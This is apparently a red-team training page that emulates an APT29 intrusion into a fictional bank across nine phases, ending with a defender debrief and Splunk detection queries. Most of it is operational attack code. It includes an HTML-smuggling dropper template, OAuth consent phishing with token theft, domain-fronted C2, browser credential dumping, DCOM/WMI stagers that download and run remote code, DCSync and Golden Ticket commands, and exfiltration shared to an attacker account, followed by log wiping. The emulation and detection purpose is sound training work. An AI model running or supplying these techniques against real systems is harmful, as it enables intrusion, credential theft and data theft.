---
layout: training-page
title: "APT29 Financial Sector Simulation — Red Team Academy"
module: "Scenarios"
tags:
  - apt29
  - cozy-bear
  - financial-sector
  - html-smuggling
  - oauth-abuse
  - domain-fronting
  - golden-ticket
page_key: "scenarios-apt29-financial"
render_with_liquid: false
---

# APT29 Financial Sector Simulation

## Scenario Overview

This scenario emulates an APT29 (Cozy Bear / NOBELIUM) intrusion campaign against a fictional US financial services firm. The threat actor's objective is long-term persistent access to steal merger and acquisition intelligence. The simulation runs across eight phases over a simulated eight-week campaign. Operators execute each phase using documented APT29 TTPs sourced from public threat intelligence reports including the 2020 SolarWinds campaign analysis, the 2021 NOBELIUM spearphishing campaign (Microsoft MSTIC), and Mandiant/FireEye APT29 attribution reports.

This is not a noisy penetration test. APT29 operates with nation-state patience and precision. Beacon intervals are measured in hours, not seconds. Every action is weighed against detection risk. The defender debrief at the end of this scenario explains exactly what the blue team should have caught — and why well-resourced threat actors routinely evade even mature SOCs.

---

## Threat Actor Profile: APT29 / NOBELIUM

**Attribution:** Russia's Foreign Intelligence Service (SVR — Sluzhba Vneshney Razvedki)  
**Also known as:** Cozy Bear, The Dukes, Midnight Blizzard (Microsoft), YTTRIUM (Microsoft pre-2021), UNC2452 (Mandiant)  
**Active since:** 2008 (earliest documented activity)  
**Primary motivation:** Strategic intelligence collection in support of Russian national interests — political intelligence, financial intelligence, foreign policy positions, defense information  
**Known victims:** US State Department, White House (2014-2015), DNC (2016), SolarWinds supply chain (2020), Microsoft corporate email (2024), multiple EU government ministries

### Known TTPs (from public intelligence)

| Category | Documented Technique |
| --- | --- |
| Initial Access | Spearphishing via HTML smuggling (T1566.001), malicious OAuth applications (T1566.002), supply chain compromise (T1195.002) |
| Execution | PowerShell (T1059.001), WMIC (T1047), scheduled tasks (T1053.005) |
| Persistence | Malicious OAuth app grants (T1098.003), registry run keys (T1547.001), scheduled tasks (T1053.005) |
| Defense Evasion | Domain fronting (T1090.004), living-off-the-land (T1218), obfuscated payloads (T1027), signed binary proxy execution (T1218) |
| Credential Access | ADFS token forgery (T1606.002), password spraying (T1110.003), credential harvesting from browser stores (T1555.003) |
| Lateral Movement | DCOM (T1021.003), remote services abuse (T1021), valid accounts (T1078) |
| Collection | Automated collection (T1119), email collection (T1114), archive collected data (T1560) |
| Exfiltration | Exfiltration over web service — cloud storage (T1567.002), exfiltration over C2 channel (T1041) |

### Operational Characteristics

APT29 is distinguished by extreme patience and operational discipline. Key characteristics:

- **Long dwell times** — APT29 has been documented with dwell times exceeding 14 months before detection
- **Slow beacon intervals** — C2 check-ins configured at 12–72 hour intervals to avoid behavioral analytics
- **Legitimate service abuse** — C2 communications routed through legitimate cloud services (Azure, Microsoft Graph API, Dropbox, Slack) to blend with normal enterprise traffic
- **Minimal footprint** — Strong preference for in-memory execution, avoiding disk writes where possible
- **Anti-forensics** — Routine cleanup of logs, artifacts, and indicators post-objective
- **Target research** — Extensive OSINT before any technical action; highly personalized phishing lures

---

## Target Profile: GlobalBank Financial Services

**Organization:** GlobalBank Financial Services (fictional)  
**Industry:** Financial services — commercial banking, investment banking, M&A advisory  
**Headcount:** ~1,500 employees across 3 US offices (New York HQ, Chicago, Los Angeles)  
**Crown jewels:** M&A deal pipeline data, client financial records, internal communications around pending deals  
**Why targeted:** GlobalBank is advising on a large cross-border acquisition — intelligence about the deal terms would be valuable to state-sponsored investors

### Technology Stack

| Layer | Technology |
| --- | --- |
| Identity | Active Directory (on-prem, Windows Server 2022), Azure AD Connect (hybrid identity), M365 E5 licenses |
| Email | Exchange Online (M365), Defender for Office 365 Plan 2 |
| Endpoints | Windows 11 workstations, Windows Server 2019/2022 servers, CrowdStrike Falcon (Insight + OverWatch) |
| Network | Palo Alto PA-5220 NGFW, GlobalProtect VPN, Zscaler Internet Access (ZIA) proxy |
| Cloud | Azure (hybrid), SharePoint Online, OneDrive for Business, Teams |
| Monitoring | Splunk SIEM, Microsoft Sentinel (secondary), CrowdStrike Falcon SIEM connector |
| Email Security | Proofpoint EAP (inbound), Defender for Office 365 P2 (Safe Links, Safe Attachments) |

### Security Maturity

GlobalBank has a mature security posture. They have:
- A 12-person SOC running 24/7 with 4-hour mean response time
- CrowdStrike Falcon Prevent (next-gen AV) + Insight (EDR) deployed to all endpoints
- Palo Alto NGFW with IPS, DNS Security, and URL filtering enabled
- M365 E5 with Defender for Office 365 P2, Conditional Access policies, and MFA enforced
- Splunk with custom detection rules correlating endpoint + network + identity telemetry

This is not a soft target. APT29-level tradecraft is required.

---

## Phase 1 — Reconnaissance

**ATT&CK Tactic:** Reconnaissance (TA0043)  
**Techniques:** Gather Victim Identity Information (T1589), Search Open Websites/Domains (T1593), Phishing for Information (T1598)

### Objective
Build a complete target picture before any technical action. Identify high-value targets for spearphishing, understand the technology stack, map externally visible infrastructure, and craft a convincing lure.

### Execution

```bash
# OSINT — Employee enumeration via LinkedIn:
# Target role: Managing Directors, M&A Advisory team, Executive Assistants to C-suite
# Use tools: linkedin2username (username generation), hunter.io (email format discovery)
python3 linkedin2username.py -c globalbank -n 50 -s 0

# Email format discovery — check MX records, hunt for format in public data:
dig MX globalbank.com
# Check hunter.io, rocketreach, snov.io for globalbank.com email format
# Result: firstname.lastname@globalbank.com

# Certificate transparency — subdomains and internal hostnames:
curl -s "https://crt.sh/?q=%25.globalbank.com&output=json" | jq -r '.[].name_value' | sort -u
# Result reveals: mail.globalbank.com, vpn.globalbank.com, sharepoint.globalbank.com,
#                 owa.globalbank.com, adfs.globalbank.com

# External footprint — Shodan:
shodan search "globalbank.com" --fields ip_str,port,org,hostnames
# Identify exposed services, banner information, software versions

# Technology stack intelligence from job postings:
# Search LinkedIn/Indeed for "GlobalBank cybersecurity engineer"
# Job postings reveal: "Experience with CrowdStrike Falcon", "Splunk", "Palo Alto NGFW"
# This tells us the exact defensive tooling before we touch anything

# Target selection for spearphishing:
# Best targets for financial intelligence:
# 1. M&A Managing Director — access to deal pipeline
# 2. Executive Assistant to CEO/CFO — calendar access, email delegation
# 3. IT Helpdesk — social engineering pathway to credential reset
# Chosen target: Sarah Chen, Managing Director M&A Advisory
```

**Decision Point:** If target cannot be confirmed on LinkedIn, check company press releases, conference speaker lists, and financial industry association membership directories. An incorrect target wastes a lure.

---

## Phase 2 — Spearphishing with HTML Smuggling

**ATT&CK Tactic:** Initial Access (TA0001)  
**Techniques:** Spearphishing Attachment (T1566.001), HTML Smuggling (T1027.006), User Execution: Malicious File (T1204.002)

### Objective
Deliver and execute the ROOTSAW dropper on Sarah Chen's workstation to establish an initial callback.

### Background: HTML Smuggling

HTML smuggling is a technique where a malicious JavaScript payload is embedded inside an HTML file. When the victim opens the HTML in a browser, the JS runs locally and assembles a file (executable, ISO, ZIP) from a base64-encoded blob embedded directly in the page, then triggers a browser download of the reconstructed file. The key advantage: the actual malicious binary is never transmitted over the network — only an HTML file with embedded data passes through email security gateways and web proxies, which inspect HTTP responses but cannot reassemble smuggled payloads.

APT29 documented use: MSTIC attributed HTML smuggling delivery of ROOTSAW (EnvyScout) to European government and financial targets starting in 2021.

### ROOTSAW / EnvyScout

ROOTSAW (Microsoft name: EnvyScout) is APT29's HTML smuggling dropper. The HTML file uses the `msSaveBlob()` or `download` attribute technique to drop an ISO or ZIP containing a malicious DLL or EXE. The ISO approach exploits Windows 10 auto-mount behavior: mounting an ISO file does not generate a Mark-of-the-Web (MOTW) flag on its contents, bypassing SmartScreen and many document-based security controls.

```html
<!-- Simplified ROOTSAW-style HTML smuggling template (operator crafts this) -->
<!-- This reconstructs an ISO file from embedded base64 data in the user's browser -->
<html>
<body>
<script>
// Base64-encoded ISO payload (replace with actual payload)
var data = "BASE64_ENCODED_ISO_PAYLOAD_HERE";

// Decode to binary
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    return bytes.buffer;
}

// Trigger download using msSaveBlob (IE compat) or anchor element
var blob = new Blob([base64ToArrayBuffer(data)], {type: 'application/octet-stream'});
var filename = 'GlobalBank-SecureViewer.iso';

if (window.navigator && window.navigator.msSaveBlob) {
    window.navigator.msSaveBlob(blob, filename);
} else {
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    document.body.appendChild(a);
    a.click();
}
</script>
<p>Loading secure document viewer. If the download does not start automatically, <a href="#">click here</a>.</p>
</body>
</html>
```

### Lure Construction and Delivery

```
# Lure context: Craft a compelling pretext targeting an M&A professional
# Pretext: External counterparty sharing a confidential deal summary
# From: legal-docs@securedocs-globalbank[.]com (lookalike domain, registered week prior)
# Subject: [CONFIDENTIAL] Project Summit — Transaction Summary v2.1 — Review Required
# Attachment: Transaction-Summary-Secure.html

# Register lookalike domain with privacy-protected WHOIS:
# Domain: securedocs-globalbank.com (note hyphen position)
# MX records: configure for sending (Postfix + DKIM/SPF to pass email authentication)

# Build the ISO payload:
# Contents of ISO:
#   GlobalBank-Document.lnk   → Windows shortcut, points to %windir%\system32\cmd.exe
#                                with argument: /c start msedge http://attacker-c2/stage2 & 
#                                               rundll32 version.dll,GetFileVersionInfoA
#   version.dll                → malicious DLL, APT29-style ROOTSAW dropper stub
#   GlobalBank-Cover.pdf       → decoy PDF (legitimate-looking deal summary)

# NOTE: ISO mount does NOT apply MOTW to contents
# Windows 10 21H2 and earlier auto-mount ISO on double-click
# Windows 11 22H2+ partially patched this — test against target OS version from recon

# The dropper DLL (version.dll) is a loader:
# 1. Downloads encrypted second-stage from attacker infrastructure
# 2. Decrypts in memory using XOR or AES with hardcoded key
# 3. Injects into explorer.exe or RuntimeBroker.exe via process hollowing
# 4. Cleans up — removes version.dll, modifies LNK timestamp
```

**If detected at this phase:** Proofpoint or Defender for O365 Safe Attachments will sandbox the HTML. The ISO technique may also be detected. Backup approach: deliver via Teams or SharePoint shared link (phishing via OAuth consent page, Phase 3).

---

## Phase 3 — Initial Access via Malicious OAuth Application

**ATT&CK Tactic:** Initial Access (TA0001), Persistence (TA0003)  
**Techniques:** Phishing (T1566.002), Steal Application Access Token (T1528), Additional Cloud Credentials (T1098.001), OAuth Application (T1098.003)

### Objective
If the ISO dropper is caught, fall back to a malicious OAuth application consent phishing attack. This technique grants the attacker a persistent OAuth token to access the victim's M365 resources (email, OneDrive, Teams) without requiring a password or touching an endpoint.

### OAuth Consent Phishing — How It Works

Microsoft's OAuth 2.0 implementation allows any registered Azure AD application to request permissions to a user's M365 resources. When a user clicks a consent link, they see a Microsoft-branded permissions screen. If they approve, the attacker's application receives a token with those permissions — and that token remains valid until revoked, even if the user changes their password.

APT29 documented use: Microsoft MSTIC documented consent phishing as an APT29 technique in May 2021 (NOBELIUM campaign using FOGGYWEB, MAGICWEB, and OAuth app persistence).

```bash
# Step 1: Register a malicious application in Azure AD
# Use a compromised Azure free trial account or a throwaway tenant
# Application name: "GlobalBank Secure Document Portal"
# Required permissions (select minimal to reduce suspicion):
#   - Mail.Read          (read all emails in mailbox)
#   - Files.Read.All     (read all OneDrive files)
#   - User.Read          (read user profile — required for any app)
# NOTE: These are "delegated" permissions — require user consent — not admin-only

# After registering the app, get the consent URL:
# Format:
# https://login.microsoftonline.com/common/oauth2/v2.0/authorize
#   ?client_id=YOUR_APP_CLIENT_ID
#   &response_type=code
#   &redirect_uri=https://attacker-controlled-server.com/callback
#   &scope=openid%20profile%20email%20Mail.Read%20Files.Read.All
#   &state=randomstate123

# Deliver this URL wrapped in a phishing email:
# "Please authenticate to the GlobalBank Secure Document Portal
#  to view the document shared with you."
# Button links to the attacker's consent URL above

# Step 2: Receive the authorization code at your callback server:
# Set up a simple web server to catch the OAuth callback:
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print('[*] OAuth callback received:', self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Authentication successful. You may close this window.')
HTTPServer(('0.0.0.0', 443), Handler).serve_forever()
"

# Step 3: Exchange authorization code for tokens:
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -d "client_id=YOUR_APP_ID" \
  -d "client_secret=YOUR_APP_SECRET" \
  -d "code=RECEIVED_AUTH_CODE" \
  -d "redirect_uri=https://attacker-server.com/callback" \
  -d "grant_type=authorization_code"
# Response includes access_token + refresh_token
# Refresh token valid for 90 days (default); re-exchange before expiry

# Step 4: Use token to access victim's email and files:
# Read inbox:
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=50&\$orderby=receivedDateTime+desc"

# List OneDrive files:
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/children"

# Download a specific file:
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/items/ITEM_ID/content" -o target_file.xlsx
```

**Operational Security:** OAuth tokens travel over HTTPS to Microsoft's infrastructure. The attacker's requests to the Microsoft Graph API look identical to any cloud app accessing M365 data. Palo Alto NGFW and Zscaler proxy see only encrypted HTTPS to `graph.microsoft.com` — a legitimate Microsoft domain.

---

## Phase 4 — C2 Setup with Domain Fronting

**ATT&CK Tactic:** Command and Control (TA0011)  
**Techniques:** Domain Fronting (T1090.004), Encrypted Channel (T1573.002), Non-Standard Port (T1571)

### Objective
Establish a reliable, covert C2 channel from Sarah Chen's workstation to attacker infrastructure using domain fronting to evade network-based detection.

### Domain Fronting Explained

Domain fronting routes C2 traffic through a legitimate, high-reputation CDN (Azure Front Door, Cloudflare, Fastly, Amazon CloudFront). The TLS SNI field contains a legitimate CDN domain, while the HTTP Host header inside the encrypted TLS session routes to the attacker's actual C2 server. Network inspection devices that cannot decrypt TLS (or use certificate pinning allowlists) see only connections to the CDN domain — the routing to the attacker's backend is invisible.

```bash
# C2 Framework: Cobalt Strike 4.x with custom Malleable C2 profile
# (Sliver or Brute Ratel C4 would work equally; profile shown for CS)

# Step 1: Set up Azure Front Door with attacker backend:
# Create Azure Front Door profile (use stolen/compromised Azure subscription)
# Frontend host: legitimate-looking subdomain on azurefd.net
#   e.g., globalbank-portal.azurefd.net
# Backend origin: attacker's actual VPS (185.x.x.x)
# Route: ALL paths forward to attacker backend

# Step 2: Malleable C2 profile for domain fronting via Azure Front Door:
# Key sections of the profile:
# https-beacons {
#     set uri "/api/v2/sync";
#     header "Host" "globalbank-portal.azurefd.net";  ← front domain
#     header "Accept" "application/json";
#     header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...";
# }
# The beacon connects to the CDN over TLS; inside the TLS the Host header
# routes to the attacker's real server.

# Step 3: Configure beacon behavior to match APT29 operational pace:
# Sleep interval: 4 hours (14400 seconds)
# Jitter: 25% (actual callback time varies 3–5 hours)
# This means at most ~6 callbacks per day — extremely low noise

# Step 4: Validate domain fronting is working:
curl -v --resolve globalbank-portal.azurefd.net:443:CDN_IP \
  -H "Host: globalbank-portal.azurefd.net" \
  https://globalbank-portal.azurefd.net/api/v2/sync
# Should return C2 server's staging response

# Step 5: Verify beacon in Cobalt Strike Team Server:
# Beacon shows in "Beacons" panel
# Verify: Hostname, Username, PID, Sleep interval, Last callback
# Set beacon sleep: sleep 14400 3600  (4h ± 1h jitter)
```

**OPSEC Notes:** Never task the beacon frequently from an analyst's perspective — changes in callback frequency are detectable. Maintain the pre-configured sleep interval. All tasking should be queued and retrieved by the beacon on its own schedule.

---

## Phase 5 — Credential Harvesting

**ATT&CK Tactic:** Credential Access (TA0006)  
**Techniques:** Credentials from Web Browsers (T1555.003), OS Credential Dumping: LSASS Memory (T1003.001), Credentials from Password Stores (T1555)

### Objective
Collect credentials from Sarah Chen's workstation to facilitate lateral movement to higher-value systems and to the domain controller.

```
# Execute from Cobalt Strike beacon (all in-memory, no disk writes):

# Step 1: Harvest browser credentials (low noise, no EDR alerts):
# CS inline execute-assembly SharpChrome (harvest Chrome saved passwords):
execute-assembly SharpChrome.exe logins
# SharpChrome reads the Chrome Login Data SQLite DB and decrypts via DPAPI
# Returns: URL, username, decrypted password — all in memory

# Step 2: Check credential manager:
execute-assembly SharpDPAPI.exe credentials
# Dumps Windows Credential Manager entries — often contains VPN creds,
# SharePoint credentials, and sometimes domain account passwords

# Step 3: Targeted LSASS dump (if needed) — use carefully:
# CrowdStrike Falcon WILL detect process injection into LSASS
# Use a LSASS bypass technique: Nanodump via BOF (does not call NtReadVirtualMemory directly)
# Alternatively: shadow copy of C:\Windows\NTDS (if on DC — not applicable yet)

# Better approach for Phase 5: Use the OAuth token from Phase 3 instead
# The Graph API token is worth more than a single workstation's creds
# Already have Mail.Read + Files.Read.All for the M&A Director's mailbox

# Step 4: Enumerate M365 tenant from workstation:
# Using MicroBurst or ROADtools to enumerate Azure AD from inside:
execute-assembly ROADToken.exe
# Returns: list of users, groups, conditional access policies, service principals
# Look for: service accounts, admin accounts, M365 groups with access to deal data
```

---

## Phase 6 — Lateral Movement via DCOM

**ATT&CK Tactic:** Lateral Movement (TA0008)  
**Techniques:** Distributed Component Object Model (T1021.003), Remote Services (T1021), Valid Accounts (T1078)

### Objective
Move laterally from Sarah Chen's workstation to the file server hosting deal documents, using DCOM — a technique that does not use PsExec or SMB admin shares (noisier methods APT29 avoids).

### Why DCOM?

DCOM (Distributed COM) allows COM objects to be instantiated on remote machines. Several DCOM applications accept remote method invocations that can be used for lateral movement — notably `MMC20.Application` (the MMC snap-in host), `ShellWindows`, and `ShellBrowserWindow`. These generate Windows Event ID 4624 (logon) but do NOT generate the SCM-related events that PsExec creates, making them significantly harder to distinguish from legitimate administrative activity.

```powershell
# DCOM lateral movement to file server at 10.10.20.50 (fileserver.globalbank.corp)
# Requires: local admin on target or membership in specific DCOM permission groups
# Credential: Sarah Chen's AD credentials (obtained from browser store in Phase 5)
# or use Pass-the-Hash if NTLM hash obtained

# Method 1: MMC20.Application via PowerShell (from operator workstation via beacon):
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(
    "MMC20.Application","10.10.20.50"))
$dcom.Document.ActiveView.ExecuteShellCommand(
    "cmd",$null,"/c powershell -enc BASE64_STAGER_HERE","Minimized")

# Method 2: ShellWindows DCOM object:
$shellWindows = [activator]::CreateInstance(
    [type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.20.50"))
$item = $shellWindows.Item()
$item.Document.Application.ShellExecute(
    "cmd.exe","/c powershell -enc BASE64_STAGER_HERE",
    "C:\Windows\System32",$null,0)

# Deliver a second-stage beacon to fileserver via the DCOM execution:
# BASE64_STAGER encodes: IEX(New-Object Net.WebClient).DownloadString('http://front-domain/stage2')
# This drops a new CS beacon callback on the fileserver

# Alternative: If DCOM fails due to DCOM restrictions, use WMI:
# WMI (T1047) — similarly stealthy:
$wmi = [wmiclass]"\\10.10.20.50\root\cimv2:Win32_Process"
$result = $wmi.Create("powershell.exe -enc BASE64_STAGER_HERE")
# WMI execution logs to Security Event ID 4688 + WMI activity logs
# but does not trigger SCM events (unlike PsExec)
```

**Decision Point:** If neither DCOM nor WMI work (common if target has Windows Firewall blocking COM ports), fall back to `net use` with harvested credentials and deploy payload via UNC path execution, or abuse a shared service (SQL Server, scheduled task on accessible share).

---

## Phase 7 — Active Directory Persistence: Golden Ticket

**ATT&CK Tactic:** Persistence (TA0003), Privilege Escalation (TA0004)  
**Techniques:** Golden Ticket (T1558.001), DCSync (T1003.006), OS Credential Dumping (T1003)

### Objective
From the file server foothold, escalate to domain admin and establish a Golden Ticket — a forged Kerberos TGT that grants permanent domain admin equivalent access, even if all passwords are changed.

```bash
# Step 1: From fileserver beacon — check current privileges and AD path:
# (Assume fileserver runs as domain service account or local admin was obtained)
# Need to reach Domain Controller: 10.10.10.5 (DC01.globalbank.corp)

# Step 2: DCSync to pull krbtgt hash (requires Domain Admin or DCSync rights):
# DCSync does not require running on the DC — it simulates a DC replication request
# from any domain-joined host with sufficient rights (Domain Admin, DA group member,
# or any account with Replicating Directory Changes + Replicating Directory Changes All)

# From Cobalt Strike beacon on fileserver (jump to DC context first if needed):
dcsync globalbank.corp GLOBALBANK\krbtgt
# Returns:
#   Object DN:    CN=krbtgt,CN=Users,DC=globalbank,DC=corp
#   Object GUID:  <guid>
#   NTLM:         <32-char hex hash>
#   AES256:       <64-char hex key>
#   AES128:       <32-char hex key>

# Also dump domain SID:
dcsync globalbank.corp GLOBALBANK\administrator
# Note the domain SID from the output (S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX)

# Step 3: Generate Golden Ticket using Mimikatz (in-memory via beacon):
mimikatz kerberos::golden /domain:globalbank.corp \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:KRBTGT_NTLM_HASH \
  /user:Administrator \
  /id:500 \
  /groups:512,513,518,519,520 \
  /ticket:golden.kirbi
# /groups includes: Domain Admins (512), Domain Users (513), Schema Admins (518),
#                   Enterprise Admins (519), Group Policy Creator Owners (520)

# Step 4: Inject Golden Ticket into current session:
mimikatz kerberos::ptt golden.kirbi
# Verify: klist  → should show TGT for Administrator@globalbank.corp

# Golden Ticket properties:
# - Valid for 10 years (default Mimikatz value)
# - Works even after NTLM password reset of Administrator account
# - Only invalidated by rotating krbtgt password TWICE (10 hours apart)
# - Does NOT appear in any AD log until it is used to request service tickets

# Step 5: Validate DA access:
dir \\DC01.globalbank.corp\c$
# Should succeed — now have full DC access via forged TGT
```

---

## Phase 8 — Data Collection and OneDrive Exfiltration

**ATT&CK Tactic:** Collection (TA0009), Exfiltration (TA0010)  
**Techniques:** Data from Network Shared Drive (T1039), Archive Collected Data (T1560.001), Exfiltration to Cloud Storage (T1567.002), Scheduled Transfer (T1029)

### Objective
Collect M&A deal documents from the file server and SharePoint, archive them, and exfiltrate using the victim's own OneDrive — a technique that makes network traffic appear as legitimate user activity.

```bash
# Step 1: Identify and collect deal documents from file server:
# From fileserver beacon — enumerate shares and find deal-related documents
dir \\fileserver.globalbank.corp\deals$ /s /b | findstr /i "2024\|summit\|acquisition\|merger"

# Step 2: Collect from SharePoint Online using OAuth token from Phase 3:
# Use Graph API to enumerate SharePoint sites the M&A director has access to:
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/sites?search=deals" | jq

# Download specific files from SharePoint document library:
curl -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/sites/SITE_ID/drive/items/ITEM_ID/content" \
  -o "ProjectSummit_Confidential.xlsx"

# Step 3: Archive and encrypt collected files:
# Use 7-Zip (or built-in Windows tar) with password encryption:
# From beacon: execute C:\Windows\System32\tar.exe -a -c -f staging.zip /path/to/docs
# Add password encryption:
"C:\Program Files\7-Zip\7z.exe" a -tzip -p"RandomKey_12345" staging.zip "C:\Users\schen\AppData\Local\Temp\docs\*"

# Step 4: Exfiltrate via victim's OneDrive (appears as legitimate user activity):
# Technique: Use the OAuth access token to UPLOAD collected files TO victim's OneDrive,
# in a hidden folder. Then access the OneDrive from attacker infrastructure to retrieve.
# This routes through Microsoft's CDN — logs show: Microsoft IP → Microsoft IP

curl -X PUT \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @staging.zip \
  "https://graph.microsoft.com/v1.0/me/drive/root:/.hidden_sync/staging.zip:/content"

# Step 5: Retrieve from attacker-controlled Azure account:
# Share the folder in victim's OneDrive with attacker-controlled Microsoft account
# (via Graph API sharing endpoint)
curl -X POST \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"recipients":[{"email":"attacker@outlook.com"}],"message":"","requireSignIn":true,"sendInvitation":false,"roles":["read"]}' \
  "https://graph.microsoft.com/v1.0/me/drive/root:/.hidden_sync:/invite"

# Step 6: Cleanup — remove local staging files and archive from victim OneDrive:
curl -X DELETE \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root:/.hidden_sync:/children/staging.zip"
```

**OPSEC:** The entire exfiltration occurs over HTTPS to `graph.microsoft.com` and `onedrive.live.com`. This traffic is indistinguishable from normal M365 client activity in Palo Alto NGFW and Zscaler proxy logs.

---

## Phase 9 — Cleanup

**ATT&CK Tactic:** Defense Evasion (TA0005)  
**Techniques:** Indicator Removal on Host (T1070), Clear Windows Event Logs (T1070.001), File Deletion (T1070.004)

```powershell
# Clear relevant Windows event logs (from DA access via Golden Ticket):
# Security log on compromised workstation:
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-WMI-Activity/Operational"

# Remove staged files:
Remove-Item "C:\Users\schen\AppData\Local\Temp\docs\" -Recurse -Force
Remove-Item "C:\Users\schen\AppData\Local\Temp\staging.zip" -Force

# Revoke the malicious OAuth app consent (to avoid discovery during IR):
# Note: Only do this AFTER exfiltration is complete
curl -X DELETE \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  "https://graph.microsoft.com/v1.0/oauth2PermissionGrants/GRANT_ID"

# Optional: Leave Golden Ticket in place for long-term persistence
# (krbtgt hash valid until explicitly rotated — most orgs never do this)
```

---

## Defender Debrief

### What Should Have Been Caught — and When

| Phase | What Defenders Should Have Seen | Detection Gap | Verdict |
| --- | --- | --- | --- |
| Recon | LinkedIn scraping, certificate transparency queries | No logs generated inside org perimeter | Missed — expected |
| HTML Smuggling | Defender for O365 Safe Attachments sandboxes HTML, but ISO contents may evade | ISO MOTW bypass is a known gap; patched in Win11 22H2 | Possible catch with updated policies |
| OAuth Consent | Defender for Cloud Apps "Unusual OAuth app consent" alert | Alert exists but requires tuning; many false positives | Alert likely fired but may not have been triaged |
| C2 (domain fronting) | Palo Alto DNS Security would see azurefd.net but cannot distinguish fronted C2 | TLS inspection of CDN traffic required; breaks many legitimate apps | Likely missed |
| Credential Harvesting | CrowdStrike Falcon would alert on browser credential access (Medium severity) | Alert may exist; dependent on analyst triage queue | Possible catch — analyst capacity matters |
| DCOM Lateral Movement | 4624 logon event + DCOM COM object activation event (Microsoft-Windows-DistributedCOM) | Few orgs write DCOM activity logs to SIEM; event ID 10028 rarely monitored | Likely missed |
| DCSync | CrowdStrike Falcon detects DCSync (explicit detection) — Critical alert | DCSync is well-detected; this is the most likely catch point | HIGH probability of detection |
| Golden Ticket | Forged TGT undetectable until used; event 4624 with mismatched fields | Requires Kerberos anomaly detection tuned to watch Account Domain field | May be caught if MDI (Microsoft Defender for Identity) is deployed |
| OneDrive Exfil | Microsoft Purview Data Loss Prevention would alert on bulk file uploads | DLP policy must cover personal OneDrive uploads; many orgs only protect SharePoint | Possibly missed depending on DLP scope |

### Key Detection Opportunities

**The highest-confidence detection point is the DCSync operation.** CrowdStrike Falcon Insight generates a Critical alert for DCSync replication requests from non-DC machines. A 24/7 SOC running CrowdStrike OverWatch would almost certainly escalate this within the 4-hour response SLA.

**Microsoft Defender for Identity (MDI)** would generate alerts for:
- Suspicious Kerberos ticket usage (Golden Ticket — if Kerberos encryption anomalies are present)
- DCSync replication from non-DC endpoint
- Unusual LDAP queries from endpoint workstation

**The OAuth app consent attack is systematically underdetected** in most organizations. Microsoft Cloud App Security (now Defender for Cloud Apps) has an "Unusual OAuth app" detection, but the signal-to-noise ratio is poor. Organizations should configure an admin consent workflow (requiring admin approval for all OAuth app grants) which would have blocked Phase 3 entirely.

### Recommended Detections to Build

```
# Splunk — DCSync detection (network traffic pattern to DC):
index=winlogbeat EventCode=4662 
  ObjectType="\\{19195a5b-6da0-11d0-afd3-00c04fd930c9}" 
  Properties="\\{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}" 
| stats count by src_ip, dest_ip, user

# Splunk — OAuth app consent alert:
index=azure_ad OperationName="Consent to application"
  IsInteractiveSession=true
| where NOT in_approved_app_list(AppDisplayName)
| alert

# Splunk — DCOM lateral movement (Event 10028 — DistributedCOM):
index=wineventlog source="Microsoft-Windows-DistributedCOM"
  EventCode=10028
| stats count by ComputerName, user, param1
| where count > 3
```

---

## MITRE ATT&CK Summary

| Technique ID | Name | Phase Used |
| --- | --- | --- |
| T1589 | Gather Victim Identity Information | Recon |
| T1593 | Search Open Websites/Domains | Recon |
| T1566.001 | Spearphishing Attachment | Initial Access |
| T1027.006 | HTML Smuggling | Initial Access |
| T1204.002 | User Execution: Malicious File | Initial Access |
| T1566.002 | Spearphishing via Service | Initial Access (alt) |
| T1528 | Steal Application Access Token | Initial Access (alt) |
| T1098.003 | Additional Cloud Credentials: OAuth | Persistence |
| T1090.004 | Domain Fronting | C2 |
| T1573.002 | Encrypted Channel: Asymmetric | C2 |
| T1555.003 | Credentials from Web Browsers | Credential Access |
| T1021.003 | Lateral Movement: DCOM | Lateral Movement |
| T1047 | Windows Management Instrumentation | Lateral Movement (alt) |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access |
| T1558.001 | Steal Kerberos Tickets: Golden Ticket | Persistence |
| T1039 | Data from Network Shared Drive | Collection |
| T1560.001 | Archive Collected Data: Archive via Utility | Collection |
| T1567.002 | Exfiltration to Cloud Storage | Exfiltration |
| T1029 | Scheduled Transfer | Exfiltration |
| T1070.001 | Indicator Removal: Clear Windows Event Logs | Defense Evasion |

## Key References

- [MSTIC NOBELIUM analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/)
- [APT29 ATT&CK group page](https://attack.mitre.org/groups/G0016/)
- [Mandiant APT29/UNC2452 attribution](https://www.mandiant.com/resources/blog/unc2452-merged-into-apt29)
- [GraphRunner for M365 post-exploitation via Graph API](https://github.com/dafthack/GraphRunner)
